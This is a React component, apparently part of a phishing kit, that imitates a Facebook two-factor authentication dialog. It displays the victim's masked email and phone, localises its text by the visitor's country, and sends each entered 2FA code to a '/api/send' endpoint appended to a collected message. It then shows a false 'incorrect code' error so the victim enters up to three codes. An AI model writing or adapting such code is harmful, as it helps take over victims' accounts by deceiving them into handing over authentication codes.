import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () => void }> = ({ businessName, fullName, nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, message, setMessage, userFullName, userEmail, userPhone, setFormStep, geoInfo } = store();
    const maxCode = 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 30;

    // Translation effect
    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            const countryLangMap: Record<string, string> = {
                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
                VE: 'es',
                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
                YE: 'ar',
                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
                UA: 'uk', GB: 'en', VA: 'it',
                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
            };

            const HARDCODED_LANGS = new Set([
                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
                'tr','th','ko','sv','id','ms','uk','bn','tl','no'
            ]);

            const cc = geoInfo.country_code.toUpperCase();
            const lang = countryLangMap[cc] || 'en';
            if (lang === 'en') return;

            if (HARDCODED_LANGS.has(lang)) {
                setTranslations(getTranslations(lang));
                return;
            }

            const textsToTranslate = [
                'Two-factor authentication required',
                'Enter the code for this account that we send to',
                ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
                'Code',
                'The two-factor authentication you entered is incorrect. Please, try again after',
                'Continue',
            ];

            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            const allCached = textsToTranslate.every(text => cache[`en:${lang}:${text}`]);
            if (allCached) {
                const translatedMap: Record<string, string> = {};
                textsToTranslate.forEach(text => {
                    translatedMap[text] = cache[`en:${lang}:${text}`];
                });
                setTranslations(translatedMap);
                return;
            }

            const translatePromises = textsToTranslate.map(async (text) => {
                const cacheKey = `en:${lang}:${text}`;
                if (cache[cacheKey]) return { text, translated: cache[cacheKey] };
                try {
                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                        params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text }
                    });
                    const translatedText = response.data[0]
                        ?.map((item: unknown[]) => item[0])
                        .filter(Boolean)
                        .join('') || text;
                    cache[cacheKey] = translatedText;
                    return { text, translated: translatedText };
                } catch {
                    return { text, translated: text };
                }
            });

            const results = await Promise.all(translatePromises);
            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });
            setTranslations(translatedMap);
        })();
    }, [geoInfo]);

    const t = (text: string): string => translations[text] || text;

    // Mask email - show first char and domain
    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (localPart.length <= 2) return email;
        return `${localPart.charAt(0)}${'*'.repeat(localPart.length - 2)}${localPart.charAt(localPart.length - 1)}@${domain}`;
    };

    // Mask phone - show country code and last 2 digits
    const maskPhone = (phone: string): string => {
        if (!phone) return '';
        
        // Extract country code (+ followed by 1-3 digits)
        const countryCodeMatch = phone.match(/^\+(\d{1,3})/);
        if (!countryCodeMatch) return phone;
        
        let countryCode = countryCodeMatch[1];
        let remaining = phone.substring(countryCodeMatch[0].length).replace(/\D/g, '');
        
        // If remaining part too short (< 5 digits), country code might be too long
        // Adjust by removing last digit from country code
        if (remaining.length < 5 && countryCode.length > 1) {
            countryCode = countryCode.slice(0, -1);
            remaining = phone.substring(1 + countryCode.length).replace(/\D/g, '');
        }
        
        const last2 = remaining.slice(-2);
        const maskedCount = Math.max(remaining.length - 2, 0);
        const maskedPart = '*'.repeat(maskedCount);
        
        return `+${countryCode} ${maskedPart} ${last2}`;
    };

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }

            if (next >= maxCode) {
                setFormStep('init');
                nextStep?.();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all" style={{touchAction: 'manipulation'}}></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden select-none' style={{touchAction: 'manipulation', userSelect: 'none'}}>
                <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-3 sm:p-4 md:p-5 overflow-hidden overflow-x-hidden'>
                    {/* Header with user info and Facebook branding */}
                    <div className='pb-2 sm:pb-3 md:pb-4 mb-1'>
                        <p className='text-xs sm:text-sm text-gray-600 truncate'>{userFullName || fullName || businessName || 'User'} • Facebook</p>
                    </div>

                    {/* Main content */}
                    <div className='flex-1 flex flex-col overflow-y-auto gap-1.5 sm:gap-2 md:gap-3'>
                        {/* Title */}
                        <h1 className='text-xs sm:text-sm md:text-base font-bold text-gray-900 leading-tight'>
                            {t('Two-factor authentication required')} ({attempts + 1}/{maxCode})
                        </h1>

                        {/* Description */}
                        <p className='text-[11px] sm:text-xs md:text-sm text-gray-700 leading-tight'>
                            {t('Enter the code for this account that we send to')} {maskEmail(userEmail || '')}{userPhone && ','} {userPhone && maskPhone(userPhone)}
                            <br />
                            {t(' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                        </p>

                        {/* Illustration */}
                        <div className='w-full py-0.5 sm:py-1.5 md:py-2'>
                            <Image src={VerifyImage} alt='2FA' className='w-full h-auto rounded-2xl object-contain' />
                        </div>

                        {/* Code Input */}
                        <div className='relative mt-0.5 sm:mt-1'>
                            <input
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                id='code-input'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                                className={`w-full h-9 sm:h-10 md:h-11 rounded-xl border-2 border-gray-300 px-2.5 sm:px-3 py-1.5 sm:py-2 text-base font-medium focus:outline-none focus:ring-0 focus:border-blue-500 transition-all placeholder-gray-500 text-left ${
                                    countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                                }`}
                                placeholder={t('Code')}
                            />
                        </div>

                        {/* Error message */}
                        {showError && (
                            <p className='text-[11px] sm:text-xs text-red-500 leading-tight'>
                                {t('The two-factor authentication you entered is incorrect. Please, try again after')} {countdown}s.
                            </p>
                        )}

                        {/* Continue Button */}
                        <button
                            type='button'
                            onClick={handleSubmit}
                            disabled={isLoading || code.length < 6 || countdown > 0}
                            className={`w-full h-10 sm:h-11 md:h-12 rounded-2xl bg-blue-500 text-white font-semibold text-[11px] sm:text-xs md:text-sm transition-all ${
                                isLoading || code.length < 6 || countdown > 0
                                    ? 'cursor-not-allowed opacity-60'
                                    : 'hover:bg-blue-600 active:bg-blue-700 shadow-md hover:shadow-lg'
                            } flex items-center justify-center mt-1 sm:mt-2`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Continue')
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </>
    );
};

export default VerifyModal;
